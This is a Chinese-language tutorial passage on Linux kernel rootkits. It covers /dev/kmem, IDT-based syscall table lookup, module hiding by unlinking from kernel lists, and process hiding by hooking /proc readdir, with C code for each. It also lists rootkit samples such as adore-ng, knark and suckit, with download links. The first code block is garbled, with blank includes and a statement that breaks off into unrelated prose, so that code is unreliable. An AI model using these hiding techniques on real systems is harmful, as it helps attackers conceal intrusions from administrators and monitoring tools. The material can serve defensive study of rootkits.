什么是/dev/kmem? 指的是kernel看到的虚拟内存的全镜像。可以用来访问kernel的内容，查看kernel的变量，也是DKOM rootkit的目标对象。注意还有个设备叫做/dev/mem,这是物理内存的全镜像，可以用来访问物理内存。  
以下是DKOM rootkit利用/dev/kmem来获取syscall table地址的代码：  
``` c
#include 
#include 
#include 
#include 
struct {
        unsigned short limit;
        unsigned int base;
} __attribute__ ((packed)) idtr;
struct {
        unsigned short off1;
        unsigned short sel;
        unsigned char none,flags;
        unsigned short off2;
} __attribute__ ((packed)) idt;
int kmem;
void readkmem (void *m,unsigned off,int sz)
{
        if (lseek(kmem,off,SEEK_SET)!=off) {
                perror("kmem lseek"); exit(2);
        }
        if (read(kmem,m,sz)!=sz) {
                perror("kmem read"); exit(2);
        }
}
#define CALLOFF 100     /* we'll read first 100 bytes of int $0x80*/
main ()
{
        unsigned sys_call_off;
        unsigned sct;
        char sc_asm[CALLOFF],*p;
        /* well let's read IDTR */
        asm ("sidt %0" : "=m" (idtr));
        printf("idtr base at 0x%X\n",(int)idtr.base);
        /* now we will open kmem */
        kmem = open ("/dev/kmem",O_RDONLY);
        if (kmemnext引用。要枚举module的方法有许多种：  
a）.VFS方法: cat /proc/module: 直接读取/proc/module下的项;   
b). ring3方法: lsmod: 本质还是在读取/proc/module，做了一个代码封装，提供给用户一个良好的接口和界面;  
c). LKM方法: 直接通过kernel module枚举struct module->list;   
d). LKM方法: 直接通过kernel module枚举struct module->mkobj->kobj->entry;   
e).lKM方法: 直接通过kernel module枚举module->mkobj->kobj->kset.    
下面介绍采用断链法技术进行内核模块隐藏的代码：   
``` c
/*
MODULE HELPERS
使用"断链法"技术进行内核模块的隐藏
原理:
1. linux将所有的内核模块都在内核中用循环双链表串联起来了
2. 通过找到这些链表，并使用linux提供的链表操作宏将指定的"元素(对应内核模块)"从链表中断开
3. 我们再通过lsmod、或者直接读取内核模块链表的时候自然无法枚举到被我们隐藏的模块了，达到隐藏模块的目的
关于内核模块链表的相关知识请参阅
http://www.cnblogs.com/LittleHann/p/3865490.html
*/
void module_hide(void)
{
    if (module_hidden) 
    {
        return;
    }
    /*
    从struct module结构体可以看出，在内核态，我们如果要枚举当前模块列表，可以使用list、kobj这两个成员域进行枚举
    自然在断链隐藏的时候也需要对这两个成员进行操作
    */
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}
```
有关LKM模块隐藏还可参考： [Linux Rootkit系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)  
## 0x07 Example-Process Hiding
上文提到，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果。
以下是基于/proc目录读取函数劫持的进程隐藏代码：  
``` c
static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
    proc_filldir_orig = filldir;
    return proc_readdir_orig(filp, dirent, proc_filldir_new);
}
//CALLBACK SECTION
static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    int i;
    for (i=0; i < current_pid; i++) 
    {
        /*
        当检测到指定的需要隐藏的进程时，直接returned返回，即直接跳过这个进程的枚举
        */
        if (!strcmp(name, pids_to_hide[i])) 
        {
            return 0;
        } 
    }
    if (!strcmp(name, "rtkit")) 
    {
        return 0;
    }
    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}
```
## 0x08 Rootkit Sample
1). adore-ng(lkm)。adore-ng不修改系统调用层的内容，而是通过修改VFS（Virtual Filesystem Switch)层的具体处理函数，如替换VFS层的 file_ops等函数，来实现信息隐藏目的。原理细节可参考：[adore-ng learning](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform). 下载： [adore-ng 0.41](https://packetstormsecurity.com/files/32843/adore-ng-0.41.tgz.html), [adore-ng github for linux 2.6 and 3.x](https://github.com/chonghw/adore-ng)  
2). knark(Hooking system call). 行为：隐藏或显示文件或目录； 隐藏TCP或UDP连接；程序执行重定向；非授权地用户权限增加(“rootme”)； 改变一个运行进程的UID/GID的工具；非授权地、特权程序远程执行守护进程(后门端口)；Kill –31: 隐藏运行的进程；调用表修改: rootkit通过修改导出的系统调用表，对与攻击行为相关的系统调用进行替换，隐藏攻击者的行踪。 原理细节可参考： [kark learning](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform) .下载：[knark download](https://packetstormsecurity.com/files/24853/knark-2.4.3.tgz.html)  
3).suckit. 行为：采用动态隐藏的方式来隐藏指定的内容，包括文件、进程、以及网络连接。suckit不同于其它基于lkm的hooking rootkit，没有修改系统调用表的内容，而是首先拷贝了系统调用表，然后将拷贝的系统调用表按照攻击者的意图进行修改执行攻击者改写的系统调用响应函数,然后将system_call（INT 80服务程序)从旧的系统调用表上移开，指向新的系统调用表. 有关suckit原理详细介绍，可参考: [suckit learning](http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf)。 下载：[suckit download](https://packetstormsecurity.com/files/40690/suckit2priv.tar.gz.html)  
其它rootkit samples还包括：[enyelkm](https://github.com/David-Reguera-Garcia-Dreg/enyelkm)，[wnps](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform)， [brootkit](https://github.com/cloudsec/brootkit)（其中brootkit详细介绍可参考[brookit analysis](http://www.cnblogs.com/LittleHann/p/4321826.html)）， [xingyiquan](https://packetstormsecurity.com/files/128945/Xingyiquan-Linux-2.6.x-3.x-Rootkit.html)，[synapsys](https://packetstormsecurity.com/files/24482/Synapsys-lkm.tar.gz.html) 。